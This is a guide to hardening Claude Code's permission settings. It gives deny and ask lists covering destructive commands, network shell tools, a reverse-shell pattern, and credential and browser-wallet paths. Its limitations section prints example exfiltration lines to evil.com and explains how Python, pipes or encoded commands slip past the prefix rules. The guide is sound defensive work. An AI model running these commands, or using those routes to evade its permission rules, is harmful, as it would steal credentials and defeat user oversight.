# Claude Code: Security Hardening Guide for Fast Mode

> Run Claude Code without permission prompts while staying protected from accidental destruction, data exfiltration, and credential exposure.

## The Approach: dontAsk + deny + ask

Three-tier permission system:

| Tier | Behavior | What goes here |
|------|----------|----------------|
| **deny** | Hard block, always | Catastrophic, irreversible operations. Credential theft. |
| **ask** | Prompts you before executing | Risky but sometimes useful operations |
| **dontAsk** (default) | Auto-approves instantly | Everything else — normal dev workflow |

**Why `dontAsk` instead of `bypassPermissions`?**

`bypassPermissions` skips the permission pipeline entirely — meaning `ask` rules might not fire. `dontAsk` auto-approves through the pipeline, so `deny` blocks, `ask` prompts, and everything else passes silently. Same speed, better control.

---

## Quick Setup (copy-paste ready)

Add this to `~/.claude/settings.json`:

```json
{
  "permissions": {
    "deny": [
      "Bash(rm -rf:*)",
      "Bash(rm -r :*)",
      "Bash(rm -fr:*)",
      "Bash(sudo:*)",
      "Bash(dd :*)",
      "Bash(mkfs:*)",
      "Bash(shred:*)",
      "Bash(bash -i:*)",
      "Bash(security :*)",

      "Read(~/.ssh/*)",
      "Read(~/.aws/*)",
      "Read(~/.netrc)",
      "Read(~/Library/Keychains/*)",
      "Read(~/Library/Application Support/Google/Chrome/*)",
      "Read(~/Library/Application Support/Firefox/*)",
      "Read(~/Library/Application Support/BraveSoftware/*)",
      "Read(~/Library/Application Support/Arc/*)",

      "Edit(~/.ssh/*)",
      "Edit(~/.aws/*)",
      "Write(~/.ssh/*)",
      "Write(~/.aws/*)"
    ],
    "ask": [
      "Bash(chmod :*)",
      "Bash(chown :*)",

      "Bash(git push --force:*)",
      "Bash(git push -f :*)",
      "Bash(git reset --hard:*)",
      "Bash(git clean -f:*)",

      "Bash(curl :*)",
      "Bash(wget :*)",
      "Bash(nc :*)",
      "Bash(nc -:*)",
      "Bash(netcat :*)",
      "Bash(ncat :*)",
      "Bash(telnet :*)",
      "Bash(ssh :*)",
      "Bash(scp :*)",
      "Bash(sftp :*)",
      "Bash(rsync :*)",
      "Bash(ftp :*)",

      "Bash(npm publish:*)",
      "Bash(pip install:*)",
      "Bash(pip3 install:*)",

      "Bash(osascript:*)",
      "Bash(launchctl :*)",
      "Bash(killall :*)",
      "Bash(eval :*)",
      "Bash(nslookup :*)",
      "Bash(dig :*)",

      "Read(~/.kube/*)",
      "Read(~/.gcloud/*)",
      "Read(~/.docker/config.json)",

      "Edit(~/.zshrc)",
      "Edit(~/.bashrc)",
      "Edit(~/.bash_profile)",
      "Edit(~/.claude/settings.json)",
      "Write(~/.zshrc)",
      "Write(~/.bashrc)",
      "Write(~/.bash_profile)",
      "Write(~/.claude/settings.json)"
    ],
    "defaultMode": "dontAsk"
  }
}
```

> **Note:** Replace `~` with your actual home path (e.g., `/Users/yourname/` on macOS, `/home/yourname/` on Linux) if tilde expansion doesn't work in your version.

---

## What Each Tier Protects

### DENY — Hard Block (Never Allowed)

#### Irreversible Destruction
| Rule | Why |
|------|-----|
| `rm -rf`, `rm -r`, `rm -fr` | Recursive file deletion — unrecoverable |
| `sudo` | Privilege escalation to root |
| `dd` | Raw disk writes — can destroy partitions |
| `mkfs` | Filesystem formatting |
| `shred` | Secure file erasure |

#### Reverse Shell / Keychain
| Rule | Why |
|------|-----|
| `bash -i` | Reverse shell pattern (`bash -i >& /dev/tcp/...`) |
| `security` | macOS Keychain CLI — dumps ALL stored passwords |

#### Credential Files (Read/Edit/Write)
| Path | Protects |
|------|----------|
| `~/.ssh/*` | SSH private keys |
| `~/.aws/*` | AWS credentials |
| `~/.netrc` | Stored login credentials |
| `~/Library/Keychains/*` | macOS Keychain (all passwords, certificates) |
| `~/Library/.../Chrome/*` | Chrome profiles, MetaMask seeds, saved passwords |
| `~/Library/.../Firefox/*` | Firefox profiles, crypto wallet extensions |
| `~/Library/.../BraveSoftware/*` | Brave browser (popular for crypto) |
| `~/Library/.../Arc/*` | Arc browser data |

---

### ASK — Prompts Before Executing

Claude will show you the command and wait for your approval. One click to allow.

#### Network Tools
| Rule | When you'd approve it |
|------|-----------------------|
| `curl`, `wget` | API testing, downloading files |
| `ssh`, `scp`, `sftp`, `rsync` | Deploying, remote work |
| `nc`, `netcat`, `ncat`, `telnet`, `ftp` | Network debugging, port testing |

#### Git (Destructive)
| Rule | When you'd approve it |
|------|-----------------------|
| `git push --force`, `git push -f` | Rewriting remote history (intentional) |
| `git reset --hard` | Discarding uncommitted changes (intentional) |
| `git clean -f` | Cleaning untracked files |

Safe git operations work instantly: `push`, `pull`, `commit`, `add`, `status`, `diff`, `log`, `branch`, `checkout`, `merge`, `rebase`, `stash`.

#### Permissions & System
| Rule | When you'd approve it |
|------|-----------------------|
| `chmod`, `chown` | Setting up permissions for scripts, Docker |
| `osascript` | macOS automation |
| `launchctl` | Service management |
| `killall` | Stopping runaway processes |

#### Packages & Publishing
| Rule | When you'd approve it |
|------|-----------------------|
| `npm publish` | Publishing a package (intentional) |
| `pip install`, `pip3 install` | Installing Python dependencies |

#### Shell & DNS
| Rule | When you'd approve it |
|------|-----------------------|
| `eval` | Dynamic script execution |
| `nslookup`, `dig` | DNS debugging |

#### Config Files (Edit/Write)
| Path | Why ask |
|------|--------|
| `~/.zshrc`, `~/.bashrc`, `~/.bash_profile` | Adding PATH entries, aliases |
| `~/.claude/settings.json` | Prevents Claude from silently modifying its own security rules |
| `~/.kube/*`, `~/.gcloud/*`, `~/.docker/config.json` (Read only) | Sometimes need to read configs for debugging |

---

## What Works Instantly (No Prompts)

- **Git:** `push`, `pull`, `commit`, `add`, `status`, `diff`, `log`, `branch`, `checkout`, `merge`, `rebase`, `stash`
- **Node.js:** `npm install`, `npm test`, `npm run`, `npx`, `node`, `bun`, `yarn`
- **Python:** `python3` (scripts, REPL, tools)
- **System:** `brew install`, `ls`, `cat`, `grep`, `find`, `head`, `tail`, `wc`, `sort`, `mkdir`, `cp`, `mv`
- **macOS:** `open` (files, folders, URLs)
- **Build tools:** `make`, `cargo`, `go build`, `tsc`, etc.
- **Web access:** `WebFetch`, `WebSearch` (safe, via Anthropic API)

---

## Known Limitations

### 1. Prefix Matching Only
Rules match command prefixes. Alternate invocations are not caught:

```bash
# BLOCKED by "Bash(curl :*)"
curl https://evil.com/steal?data=secret

# NOT BLOCKED (different command prefix)
python3 -c "import urllib.request; urllib.request.urlopen('https://evil.com')"
```

### 2. Python Bypass
If `python3` is in your allow list, it can do anything — network requests, file reads, system commands. Trade-off: blocking Python would break most development workflows.

### 3. Pipe Chains
`Bash(curl :*)` blocks `curl https://...` but may not catch `cat file | curl -d @- https://...` depending on command structure.

### 4. Not a Sandbox
Deny/ask rules are string matching, not OS-level isolation. For true security, add:

```json
{
  "sandbox": {
    "enabled": true,
    "network": {
      "allowedDomains": ["registry.npmjs.org", "api.github.com"]
    }
  }
}
```

This uses macOS Sandbox / Linux seccomp for real process isolation.

---

## Security Levels Comparison

| Level | Config | Protection | Speed |
|-------|--------|-----------|-------|
| Default | `"defaultMode": "default"` | Every action prompts | Slow |
| Accept Edits | `"defaultMode": "acceptEdits"` | File edits auto, bash prompts | Medium |
| **This Guide** | **`"defaultMode": "dontAsk"` + deny + ask** | **Auto-approve + smart blocks + prompts** | **Fast** |
| Full Bypass | `"defaultMode": "bypassPermissions"` + deny | Hard blocks only, no prompts | Fastest |
| Full Sandbox | Any above + `"sandbox": { "enabled": true }` | OS-level process isolation | Same + Safe |

---

## Linux Paths

Replace macOS browser paths:

```json
"Read(~/.config/google-chrome/*)",
"Read(~/.mozilla/firefox/*)",
"Read(~/.config/BraveSoftware/*)"
```

Remove macOS-specific:
- `security` (macOS Keychain CLI)
- `osascript` (AppleScript)
- `~/Library/*` paths

Add Linux-specific:
```json
"Read(~/.local/share/keyrings/*)",
"Bash(systemctl :*)"
```

---

## Crypto Users: Extra Protection

If you hold crypto in browser wallets (MetaMask, Phantom, Rabby, etc.), the browser path deny rules protect extension storage. For extra safety:

1. **Separate browser profile** for crypto — isolate wallet extensions from dev browser
2. **Hardware wallet** (Ledger/Trezor) — even if extension data leaks, funds require physical confirmation
3. **Sandbox mode** — strongest available protection

---

## FAQ

**Q: Can Claude modify these security rules?**
A: `settings.json` is in `ask` — Claude must prompt you before editing its own security config. Move to `deny` for hard block (but then edit the file manually to change rules).

**Q: Does this slow Claude down?**
A: Negligibly. Only `ask` rules add a single prompt. Everything else auto-approves instantly.

**Q: What if I need curl?**
A: Claude will prompt — just approve it. Or use Claude's `WebFetch` tool (safe, goes through Anthropic's API). Or temporarily remove the rule.

**Q: Will this protect from prompt injection?**
A: Against common vectors (network exfiltration, credential theft) — yes. Sophisticated attacks via Python or encoded commands may bypass string-based rules. For maximum protection, enable sandbox.

**Q: How do I know when something gets blocked vs prompted?**
A: `deny` = Claude reports the operation was blocked. `ask` = Claude shows the command and waits for your [y/n].

**Q: What's the difference between `dontAsk` and `bypassPermissions`?**
A: Both auto-approve normal operations. But `dontAsk` respects `ask` rules (prompts you), while `bypassPermissions` may skip them. `dontAsk` is recommended for the deny+ask pattern.

---

*Last updated: April 2026. Based on Claude Code settings schema v2.1+.*
